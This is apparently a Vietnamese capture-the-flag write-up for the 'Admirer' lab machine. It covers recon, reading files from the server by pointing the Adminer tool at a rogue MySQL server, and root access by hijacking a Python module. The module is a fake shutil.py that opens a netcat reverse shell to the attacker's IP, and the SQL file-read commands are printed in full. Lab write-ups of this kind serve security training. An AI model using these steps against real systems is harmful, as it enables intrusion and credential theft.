# admirer

- recon

liệt kê 3 port mở: 21, 22 và 80

các version được sử dụng -> sau khi tìm kiếm ko thấy PoC tương ứng

![https://lh7-us.googleusercontent.com/_2qsvbyvzHJBczfUnryhNQlH9s2f9TkrvCl92ctN9YEKdej551wn6AajW7QDnkYOi5EvKA-BkAFOtHgWyw8QVW_kDlIxdkEEccdem0ZM6Mj2_hE4L5r1jYTrRV_8i8-27QESBx9usc7Y](https://lh7-us.googleusercontent.com/_2qsvbyvzHJBczfUnryhNQlH9s2f9TkrvCl92ctN9YEKdej551wn6AajW7QDnkYOi5EvKA-BkAFOtHgWyw8QVW_kDlIxdkEEccdem0ZM6Mj2_hE4L5r1jYTrRV_8i8-27QESBx9usc7Y)

trong robots.txt lộ account waldo và đường dẫn thú vị /admin-dir

![https://lh7-us.googleusercontent.com/Ahov2os4iLMcynFCPxbwLZKUOOfdxm4TFfB6z2DtXYzG3nRp8_eqehp9CDGEYsKSFPnKPaDoZk3xgAMADsc32JeQ7YePqfBJqj0xrR_ajmCZ7pwfHjHXGvwfwGVCdAbWDfcxSEnFgfZS](https://lh7-us.googleusercontent.com/Ahov2os4iLMcynFCPxbwLZKUOOfdxm4TFfB6z2DtXYzG3nRp8_eqehp9CDGEYsKSFPnKPaDoZk3xgAMADsc32JeQ7YePqfBJqj0xrR_ajmCZ7pwfHjHXGvwfwGVCdAbWDfcxSEnFgfZS)

nhưng truy cập /admin-dir 403

các path ko có gì thú vị

![https://lh7-us.googleusercontent.com/mEWoEdoZRE8B4obPLt45zDhp3l76O4G2DAUKDSqdmExc7ZtctAT9KTl2c0Nf3dYCX99A7gZM5zHz6rLV0e937OA_uP4hKe3lpvOK3YQS4Km1zf6yYT7U0Zbzi3wu0caA6JR9r8Yjy44Z](https://lh7-us.googleusercontent.com/mEWoEdoZRE8B4obPLt45zDhp3l76O4G2DAUKDSqdmExc7ZtctAT9KTl2c0Nf3dYCX99A7gZM5zHz6rLV0e937OA_uP4hKe3lpvOK3YQS4Km1zf6yYT7U0Zbzi3wu0caA6JR9r8Yjy44Z)

ftp ko connect as anonymous được

![https://lh7-us.googleusercontent.com/FIvgwDmI-t_plp2bpsp_fOlk93DSdg3WzAHHwvbiRcZuQAzb4AtxI8pGDzbwds5sYKZJWn_ux2rj0VRQP-GQDuJO4gLKPcsnes0B3pO0stxbSISaafamXrL0VrGevaZDYE7aIrs2Dh1n](https://lh7-us.googleusercontent.com/FIvgwDmI-t_plp2bpsp_fOlk93DSdg3WzAHHwvbiRcZuQAzb4AtxI8pGDzbwds5sYKZJWn_ux2rj0VRQP-GQDuJO4gLKPcsnes0B3pO0stxbSISaafamXrL0VrGevaZDYE7aIrs2Dh1n)

truy cập p80 ko có gì khả nghi

![https://lh7-us.googleusercontent.com/7uaM-clykNVOLZN-SyDm75JYYdllMmlWerR4yfvBS9PSxwit9Acj9LigQxTwjoQEfZ-ekzeFC9OSm4gxmb81yh-8wNTdUuMAQBpg26hbv3yX6ONNEhKpQnHmxEyDlD4WT_JAYFxAbN1F](https://lh7-us.googleusercontent.com/7uaM-clykNVOLZN-SyDm75JYYdllMmlWerR4yfvBS9PSxwit9Acj9LigQxTwjoQEfZ-ekzeFC9OSm4gxmb81yh-8wNTdUuMAQBpg26hbv3yX6ONNEhKpQnHmxEyDlD4WT_JAYFxAbN1F)

/about

![https://lh7-us.googleusercontent.com/2B-SbK_zn4BeDo3rL7SHpSEZ1fMUzq3ucrmk7PpHs3N8ezS_KJOphh3rExXcwLdASR7BwypUIOlhRDMZhOlzdItSokZ1oBFMO4KYK7gsAp1v0g0cUKI38RHPgWrNNkEY-zpj1_qXjEPg](https://lh7-us.googleusercontent.com/2B-SbK_zn4BeDo3rL7SHpSEZ1fMUzq3ucrmk7PpHs3N8ezS_KJOphh3rExXcwLdASR7BwypUIOlhRDMZhOlzdItSokZ1oBFMO4KYK7gsAp1v0g0cUKI38RHPgWrNNkEY-zpj1_qXjEPg)

thử sqli ko thấy thay đổi gì

![https://lh7-us.googleusercontent.com/kKF0PHvXj_FEz07XJG9lGdSDPETrXnZUfJiM5alrr5P1k275qOkyGlsGGbvq0hGIyOO6bdyXJpIC4N0sKSZPZQs9MKYQqeYz92BrefGBp8x1tv2RSF8wEhDp5e8I-5y5jVw9ztdpaqB0](https://lh7-us.googleusercontent.com/kKF0PHvXj_FEz07XJG9lGdSDPETrXnZUfJiM5alrr5P1k275qOkyGlsGGbvq0hGIyOO6bdyXJpIC4N0sKSZPZQs9MKYQqeYz92BrefGBp8x1tv2RSF8wEhDp5e8I-5y5jVw9ztdpaqB0)

tìm các file cụ thể trên /admin-dir dùng wordlist: common.txt chứ small.txt ko có credentials

python3 dirsearch.py -u http://10.10.0.187/admin-dir/ -w common.txt -e txt,php,py,sh,html

tìm thấy 2 tệp thú vị

![https://lh7-us.googleusercontent.com/4NcYzbuHvWCxHEovgGOdUk_9SvA1MUVKKWJOMujlwtrYcDWb2OCRMwl1xX6NeZIfLSjXLdM83OY4-iIZUnYr5pIRRWMuASeX77ULS7vttFdT3OlSJj1KI-1xlxcRwJgtcjTN9DUhVyJk](https://lh7-us.googleusercontent.com/4NcYzbuHvWCxHEovgGOdUk_9SvA1MUVKKWJOMujlwtrYcDWb2OCRMwl1xX6NeZIfLSjXLdM83OY4-iIZUnYr5pIRRWMuASeX77ULS7vttFdT3OlSJj1KI-1xlxcRwJgtcjTN9DUhVyJk)

/contacts.txt

![https://lh7-us.googleusercontent.com/D1qy34-wn0Fl0KsanL90BFjoYgb3CdxJhHGWvMh8oMFplPGVINrEO5UAsrb6to_kUInbsCpuUVQiI776NQZuHriX8m1kDYOx3ppgTcnj2GKhhNZ7xFyGAbRFkLr0hKd35Pitcjb6Vqjy](https://lh7-us.googleusercontent.com/D1qy34-wn0Fl0KsanL90BFjoYgb3CdxJhHGWvMh8oMFplPGVINrEO5UAsrb6to_kUInbsCpuUVQiI776NQZuHriX8m1kDYOx3ppgTcnj2GKhhNZ7xFyGAbRFkLr0hKd35Pitcjb6Vqjy)

/credentials.txt

![https://lh7-us.googleusercontent.com/0_FHUZPqxhxeLOEz4wD2bQ9xRZMWwygoqxEeH6TVTtGwJuasQPZkvgiZKmQOYcrvh006vr_hOfOXx2Bn-VA4pN6XJ7nKRVldGWuEbDwhjfoBKcC1TK_hcgPW5J8ilv-a-cwobCiy8Omy](https://lh7-us.googleusercontent.com/0_FHUZPqxhxeLOEz4wD2bQ9xRZMWwygoqxEeH6TVTtGwJuasQPZkvgiZKmQOYcrvh006vr_hOfOXx2Bn-VA4pN6XJ7nKRVldGWuEbDwhjfoBKcC1TK_hcgPW5J8ilv-a-cwobCiy8Omy)

kết nối được ftp và thấy có 2 tệp dl

![https://lh7-us.googleusercontent.com/ikDYZ1KYeCRXNRwYqAHSu7DG5JrP1dX9NxnD_6yz2ktFtffrM0Rf8N3aWnOi18hTIRKA-9DMHLY2s1nGwGu9Daxj4zuTuwM_h8RGcYSP7ohwg0dUVe-0xYosaSKkvD8EcOpr7PFxHJOw](https://lh7-us.googleusercontent.com/ikDYZ1KYeCRXNRwYqAHSu7DG5JrP1dX9NxnD_6yz2ktFtffrM0Rf8N3aWnOi18hTIRKA-9DMHLY2s1nGwGu9Daxj4zuTuwM_h8RGcYSP7ohwg0dUVe-0xYosaSKkvD8EcOpr7PFxHJOw)

tải xuống cả 2 file

![https://lh7-us.googleusercontent.com/quQ9_mETGVz8bnLbeSjXqO6Rv-YnMbeNzyxZxWSAPBawUxv-s1SvxUiidDWP7uvO0qPedeGQi9ifyrTNrfs3wrB9mNlcpSEB3hJeCllpxE5VRxAbkERx3ToQ6uDQ2Dq5_RBp_mWOe7Tk](https://lh7-us.googleusercontent.com/quQ9_mETGVz8bnLbeSjXqO6Rv-YnMbeNzyxZxWSAPBawUxv-s1SvxUiidDWP7uvO0qPedeGQi9ifyrTNrfs3wrB9mNlcpSEB3hJeCllpxE5VRxAbkERx3ToQ6uDQ2Dq5_RBp_mWOe7Tk)

file dump.sql

![https://lh7-us.googleusercontent.com/Q4eOz3bGdZmTVzAfZr5Mzp7mFaZoGG6835xqXUPiRSC7lb37giUirXibW4OlBe8AeW2cOPqc4uOXIYXuREihs3fA8rWuXDgiQHB8qe8wy7YZqXgHrt4j9pkVR6DDG_S9k0EaPHL017oM](https://lh7-us.googleusercontent.com/Q4eOz3bGdZmTVzAfZr5Mzp7mFaZoGG6835xqXUPiRSC7lb37giUirXibW4OlBe8AeW2cOPqc4uOXIYXuREihs3fA8rWuXDgiQHB8qe8wy7YZqXgHrt4j9pkVR6DDG_S9k0EaPHL017oM)

/html/index.php

![https://lh7-us.googleusercontent.com/7zEjAGkJkwGMz3KNjNEjrrXdD6NP148JWEMKokSx9Yii8HZO5pqI8ZqWkoS_IkL6Bgdw7NxmXr20kISsUuV74llxbT_uy6tV4ch0TzEU4beHlQHvLaCto829YPmZhjr4LduLwRXYmFNM](https://lh7-us.googleusercontent.com/7zEjAGkJkwGMz3KNjNEjrrXdD6NP148JWEMKokSx9Yii8HZO5pqI8ZqWkoS_IkL6Bgdw7NxmXr20kISsUuV74llxbT_uy6tV4ch0TzEU4beHlQHvLaCto829YPmZhjr4LduLwRXYmFNM)

![https://lh7-us.googleusercontent.com/ZJUeKmqNz3g36hZNg-H3CRWBZwHtYpDO6r_bsV_wrOBVeLSZz9a7A2lTSsCmHN5aKnKjeBsNo1IKgDUD8Oa9B3vMlJV4oQw1onz5-8Zp29g_7rBxSL35yqbW_dCZpM_CvKaQ0Nn36HMM](https://lh7-us.googleusercontent.com/ZJUeKmqNz3g36hZNg-H3CRWBZwHtYpDO6r_bsV_wrOBVeLSZz9a7A2lTSsCmHN5aKnKjeBsNo1IKgDUD8Oa9B3vMlJV4oQw1onz5-8Zp29g_7rBxSL35yqbW_dCZpM_CvKaQ0Nn36HMM)

![https://lh7-us.googleusercontent.com/gLgdzCsdUKz_UmgUPoKDyTuHqsZYovjdwpUrL6bBe-pF2ABnMWB5IH1OzkEovIGG_Rt8i8ZjCt4YQLJhQ1spVS0UBnf43c6-Df3aoxQleEpy6x7Aag91HI5e-m3sQ3IBxHjaavyXGYQd](https://lh7-us.googleusercontent.com/gLgdzCsdUKz_UmgUPoKDyTuHqsZYovjdwpUrL6bBe-pF2ABnMWB5IH1OzkEovIGG_Rt8i8ZjCt4YQLJhQ1spVS0UBnf43c6-Df3aoxQleEpy6x7Aag91HI5e-m3sQ3IBxHjaavyXGYQd)

các cred trên ko dùng được khi login

tìm thấy trang đăng nhập trong thư mục /utility-scripts. Tên của cơ sở dữ liệu có thể tìm thấy từ tệp dump.sql

gobuster -u http://10.10.10.187/utility-scripts/ -w /home/kali/Documents/SecLists/Discovery/Web-Content/big.txt -x txt,php,html

![https://lh7-us.googleusercontent.com/t_C422U6mIqTK7ehEX3zSc88eGU89THkRm8Q_d_Q-ugjTfsnkJWdMkfbZo17s6wlrOVL5zIv3MYHMlM2GGbTyuQ8H3HHx9utNwR5AMrJXfbdZ4C9foytLJctM4ABZi0y7GAdKNgpYnRp](https://lh7-us.googleusercontent.com/t_C422U6mIqTK7ehEX3zSc88eGU89THkRm8Q_d_Q-ugjTfsnkJWdMkfbZo17s6wlrOVL5zIv3MYHMlM2GGbTyuQ8H3HHx9utNwR5AMrJXfbdZ4C9foytLJctM4ABZi0y7GAdKNgpYnRp)

adminer là một công cụ quản lý cơ sở dữ liệu giống như phpmyadmin cho phép quản lý cơ sở dữ liệu thông qua trình duyệt. URI trang đăng nhập mặc định của quản trị viên là adminer.php.

![https://lh7-us.googleusercontent.com/8BEBoT7HUvFq6Bf8KEof4-f4aZeyxQBZjwSGqOu3eEYkTMjefsyhTXKBX-fwK9wQAl4NDlB0Z9amVEfB1srrvOmm3p31P_OIeqH5OO8TikvUERhM448czDqqOeL724QtTPaTZ3NUaBnY](https://lh7-us.googleusercontent.com/8BEBoT7HUvFq6Bf8KEof4-f4aZeyxQBZjwSGqOu3eEYkTMjefsyhTXKBX-fwK9wQAl4NDlB0Z9amVEfB1srrvOmm3p31P_OIeqH5OO8TikvUERhM448czDqqOeL724QtTPaTZ3NUaBnY)

ko thể login với các cred tìm đc ở trên

![https://lh7-us.googleusercontent.com/HQJVWi-3npaL5X4ZLuuDMRqZ5jzue5F-29CY3O8rL4vk_TZgds12n2_Q69vsTSP_KNSJGtckplLYJWiWsIPlzNgefX9yNh1acoRHnvhQOemOeXHQ58gvUNZexs5ygzpAQEIbbwyyjFbb](https://lh7-us.googleusercontent.com/HQJVWi-3npaL5X4ZLuuDMRqZ5jzue5F-29CY3O8rL4vk_TZgds12n2_Q69vsTSP_KNSJGtckplLYJWiWsIPlzNgefX9yNh1acoRHnvhQOemOeXHQ58gvUNZexs5ygzpAQEIbbwyyjFbb)

password null

Lỗ hổng: Tiết lộ tệp tùy ý. Nếu chúng ta phải phân loại nó theo OWASP Top 10 (2017), nó sẽ rơi vào dòng Tiếp xúc với dữ liệu nhạy cảm. Về cơ bản, Kẻ tấn công có thể lợi dụng lỗ hổng này để lấy mật khẩu cho bất kỳ CMS nào được cài đặt từ cơ sở dữ liệu hoặc giành toàn quyền truy cập vào cơ sở dữ liệu.

đọc files trên Server bằng cách ghi chúng vào database mình vừa tạo.

Để khai thác lỗ hổng này, cần định cấu hình máy chủ MySQL trên Kali Linux:

- thêm bảng và cột vào đó.
- tạo user adminer và cung cấp cho nó tất cả các Đặc quyền
- Xóa những hành động đó và tiếp tục tạo cơ sở dữ liệu có cùng tên với “quản trị viên” của máy mục tiêu
- tạo một bảng test với column là data.

```sql
CREATE DATABASE admirer;

CREATE USER 'adminer'@'%' IDENTIFIED BY 'password';

GRANT ALL PRIVILEGES ON *. *TO'adminer'@'%';

FLUSH PRIVILEGES;

create table test(data VARCHAR(255));
```

sửa để Mysql không chỉ listen internal -> Sửa dòng này: bind-address = 0.0.0.0 là ok.

![https://lh7-us.googleusercontent.com/-p9IGktkxLb0vuAnWv8R6ej0V6bkOASv5Y2N9ZTxQxDnJuAOoqLGMznkVGwADa1KGHwgcexXDpDjEG3lR2N3uLno_piQF4H_f_vO9g7n0kaMh_lTmOED1nRPndnmVjPkHB2EYyjIUBt0](https://lh7-us.googleusercontent.com/-p9IGktkxLb0vuAnWv8R6ej0V6bkOASv5Y2N9ZTxQxDnJuAOoqLGMznkVGwADa1KGHwgcexXDpDjEG3lR2N3uLno_piQF4H_f_vO9g7n0kaMh_lTmOED1nRPndnmVjPkHB2EYyjIUBt0)

restart mysql: systemctl restart mysql

đăng nhập adminer webpage

Server → 10.10.16.4

User → adminer

Password → password

Database → admirer

thực thi lệnh sql tại sql command

LOAD DATA LOCAL INFILE '/etc/passwd'

INTO TABLE test

FIELDS TERMINATED BY "\n"

![https://lh7-us.googleusercontent.com/iSPdgNo6ba6V7G98Jij2rJ2LdnIGzxJydP2q22eml_LgcM6uggZAulA3e4EIZ8HCvKoSM_o9utO7N4ugsLT5a8GIxIQuZuVaZtdOdHG20y43prRltgQVh2VtDGVyFLGZeb91QVbjMZ9x](https://lh7-us.googleusercontent.com/iSPdgNo6ba6V7G98Jij2rJ2LdnIGzxJydP2q22eml_LgcM6uggZAulA3e4EIZ8HCvKoSM_o9utO7N4ugsLT5a8GIxIQuZuVaZtdOdHG20y43prRltgQVh2VtDGVyFLGZeb91QVbjMZ9x)

Tuy nhiên, có lỗi ở trên do hạn chế open_basedir. Khi kiểm tra tệp phpinfo đã được xác định trước đó, chúng ta có thể thấy rằng thư mục open_basedir được phép trên máy chủ là /var/www/html . Hơn nữa, chúng tôi nhớ lại rằng bản sao lưu của tệp index.php có chứa thông tin xác thực. thử đọc

![https://lh7-us.googleusercontent.com/7NdFhoovkHA-RDdMyPlB-gXiNfaicG7-HUM0SK9BvqpiGNGMD8AxJPEPsnkKiVY4cAusOqZtnQCby8nyRBEfgcZoXaX8O9ebeqeiIdJj5u5-Cb2j1jtevc3ux-kmYgc01r18Bc9VfhMp](https://lh7-us.googleusercontent.com/7NdFhoovkHA-RDdMyPlB-gXiNfaicG7-HUM0SK9BvqpiGNGMD8AxJPEPsnkKiVY4cAusOqZtnQCby8nyRBEfgcZoXaX8O9ebeqeiIdJj5u5-Cb2j1jtevc3ux-kmYgc01r18Bc9VfhMp)

query thành công -> chọn select để xem file

![https://lh7-us.googleusercontent.com/vKXzguMg_96JDy1CLSc3VuRGk0z-jQmOPsyQgq0uibF9i4Vhqt9n21aB5oEiAqWXZGCNI1m3krEoyWY1RRWRiX2FS4GYWz1QYXjjIjAfyv9FSx7l6d5gj1Z_VJlEarPlLEntUS4nO98-](https://lh7-us.googleusercontent.com/vKXzguMg_96JDy1CLSc3VuRGk0z-jQmOPsyQgq0uibF9i4Vhqt9n21aB5oEiAqWXZGCNI1m3krEoyWY1RRWRiX2FS4GYWz1QYXjjIjAfyv9FSx7l6d5gj1Z_VJlEarPlLEntUS4nO98-)

tìm thấy SQL connection details (nd tệp này khác hẳn với file index.php được backup trên kia)

![https://lh7-us.googleusercontent.com/8-E21QbvfsXFPUPPZPs7wzfBL-IqZI4gM0K6sPE51MHIkeus6xR7lvGP6Q5JAyvs-8KaLg2t1y7YO5o5K3eBRRqi1BviKB8dZa5AiaTjyep2xvDxonRCDTso7yhbUxUWGXvDvbWOHejW](https://lh7-us.googleusercontent.com/8-E21QbvfsXFPUPPZPs7wzfBL-IqZI4gM0K6sPE51MHIkeus6xR7lvGP6Q5JAyvs-8KaLg2t1y7YO5o5K3eBRRqi1BviKB8dZa5AiaTjyep2xvDxonRCDTso7yhbUxUWGXvDvbWOHejW)

ssh waldo

![https://lh7-us.googleusercontent.com/Itf6j6tB8x7X28R8xTeV-bhZnnyc1g0IXlDhhGYudtGvMBPqnjDr62sfxwazvkY1QuZAtgSohg2GU68qYMVJ36uVBawS_cQWteomvTk5GE6FJKvJaE3l1hGvchsAo38vLrBdOXPYZHha](https://lh7-us.googleusercontent.com/Itf6j6tB8x7X28R8xTeV-bhZnnyc1g0IXlDhhGYudtGvMBPqnjDr62sfxwazvkY1QuZAtgSohg2GU68qYMVJ36uVBawS_cQWteomvTk5GE6FJKvJaE3l1hGvchsAo38vLrBdOXPYZHha)

![https://lh7-us.googleusercontent.com/RI5BY5KCI_EbwbaDAly8N7xkwxLpgdYkzzSE7JVu122AAZhSGpA3VwBW7krVOqFM-LjNOK_D2HAde41wQpEpTuPgtFHK33sS5DEvDQI1pGpNPOIoUMgN2UondiHoHSeetUVdymHGVAwy](https://lh7-us.googleusercontent.com/RI5BY5KCI_EbwbaDAly8N7xkwxLpgdYkzzSE7JVu122AAZhSGpA3VwBW7krVOqFM-LjNOK_D2HAde41wQpEpTuPgtFHK33sS5DEvDQI1pGpNPOIoUMgN2UondiHoHSeetUVdymHGVAwy)

![https://lh7-us.googleusercontent.com/3sC42RzfWQ1VWcOOWyaqCuv4HEXkpSIUo75c6BwKeGbfufVlUNxWK32I_kSp0pIg36ApB5sTCOT_SYjZC4TSjBQKRPeehpX7DUAoZx4FuX0XUAEzEhGvuLeTE24xlQa0oFazjDsjpi4C](https://lh7-us.googleusercontent.com/3sC42RzfWQ1VWcOOWyaqCuv4HEXkpSIUo75c6BwKeGbfufVlUNxWK32I_kSp0pIg36ApB5sTCOT_SYjZC4TSjBQKRPeehpX7DUAoZx4FuX0XUAEzEhGvuLeTE24xlQa0oFazjDsjpi4C)

mặc dù tìm thấy nhiều folder user khác nhưng ko có thông tin gì hữu ích

![https://lh7-us.googleusercontent.com/wFkZSHX7IDEYoGxIc4tG2fLSqRG0g3wg9GSF6UGYCi_8ReWg56WgMmV8zhTUWtarK96-bNAdQn2R5WZnOPo0GCUd9xrTbZkJhqteGLM0Z8_OY17gF-lcZW03ekkMuCD6qpts091hZCaJ](https://lh7-us.googleusercontent.com/wFkZSHX7IDEYoGxIc4tG2fLSqRG0g3wg9GSF6UGYCi_8ReWg56WgMmV8zhTUWtarK96-bNAdQn2R5WZnOPo0GCUd9xrTbZkJhqteGLM0Z8_OY17gF-lcZW03ekkMuCD6qpts091hZCaJ)

![https://lh7-us.googleusercontent.com/RjBxrUDlrQEtu9QR_K-TsUSh6PAn1XYFmadg0tAteufJ4ULDAhTVWu8CtsVGkY4heTIJYbkV57P50lTjYPON9pXHuXmbf_8g626UL1xxOVkHxiaS2U5ihbsk1Gy3RHiqeHqmTfAjGkm6](https://lh7-us.googleusercontent.com/RjBxrUDlrQEtu9QR_K-TsUSh6PAn1XYFmadg0tAteufJ4ULDAhTVWu8CtsVGkY4heTIJYbkV57P50lTjYPON9pXHuXmbf_8g626UL1xxOVkHxiaS2U5ihbsk1Gy3RHiqeHqmTfAjGkm6)

cat /opt/scripts/admin_tasks.sh

```python
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if ![ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if ![ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if ![ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if ![ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if ![ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi

# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "![![![ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options![@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0

```

cat /opt/scripts/backup.py

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
```

Dựa vào Sudo Rights được định nghĩa và 2 file trên, user Waldo có thể chỉ định environment khi execute script admin_tasks.sh với Sudo Rights. Ở option 6 (backup_root()) của script, nó trỏ đến backup.py, tại đây file này import method make_archive từ module shutil

→ kỹ thuật python hijacking

tạo ra một module tên shutil.py với method bên trong nó là make_archive() nhưng script sẽ dùng để netcat. chỉ định PYTHONPATH cho python ở thư mục đặt shutil.py

Tên phải đúng vì không có quyền ghi/thực thi với backup.py, nó chỉ có thể gọi khi thông qua admin_tasks.sh (với Sudo Rights ). Lưu ý backup.py dùng Python 3.

nội dung file shutil.py

```python
import os

def make_archive(a, b, c):

os.system("nc 10.10.16.4 1234 -e'/bin/bash'")
```

thực thi

![https://lh7-us.googleusercontent.com/vUzIH76vkKkxsTo84MgOZ9cpOEkhomtGFTBxEICkI09mI_cssXlckoRpT6DBRQgcwOnbqiswAqy3aVv6wf_ILuohmTAx21HdVUj7qfjbQIKeVC8lKkJnWHli_jP6FTc7Pv-vsRJdFnUW](https://lh7-us.googleusercontent.com/vUzIH76vkKkxsTo84MgOZ9cpOEkhomtGFTBxEICkI09mI_cssXlckoRpT6DBRQgcwOnbqiswAqy3aVv6wf_ILuohmTAx21HdVUj7qfjbQIKeVC8lKkJnWHli_jP6FTc7Pv-vsRJdFnUW)

![https://lh7-us.googleusercontent.com/7foyNodQr1jUQQDyTwOUiTxJH4ZQ7Igkgb97_OjSJl3vgtumn_4H_toUcQAtOxRgmSl3Oy8yNvb6qTZ5AembzfHPX-mN-08D6ALT02GHdFiknyl0Hwnnlb51fbBh7yjjk_TAeVBssELV](https://lh7-us.googleusercontent.com/7foyNodQr1jUQQDyTwOUiTxJH4ZQ7Igkgb97_OjSJl3vgtumn_4H_toUcQAtOxRgmSl3Oy8yNvb6qTZ5AembzfHPX-mN-08D6ALT02GHdFiknyl0Hwnnlb51fbBh7yjjk_TAeVBssELV)

![https://lh7-us.googleusercontent.com/5flvxJI6y7aXOCxLKUpjwRLWXkRLPOglL32ZS6yNDWDio3VJ0VmXvZlGVxQpnlBdC-Vuw9WsFrELt8qx6f4gE-HRwpJIU-0cMjTwL10XMARvClE8Nwn89yJId3ortnvJOmAbhFNJlgUh](https://lh7-us.googleusercontent.com/5flvxJI6y7aXOCxLKUpjwRLWXkRLPOglL32ZS6yNDWDio3VJ0VmXvZlGVxQpnlBdC-Vuw9WsFrELt8qx6f4gE-HRwpJIU-0cMjTwL10XMARvClE8Nwn89yJId3ortnvJOmAbhFNJlgUh)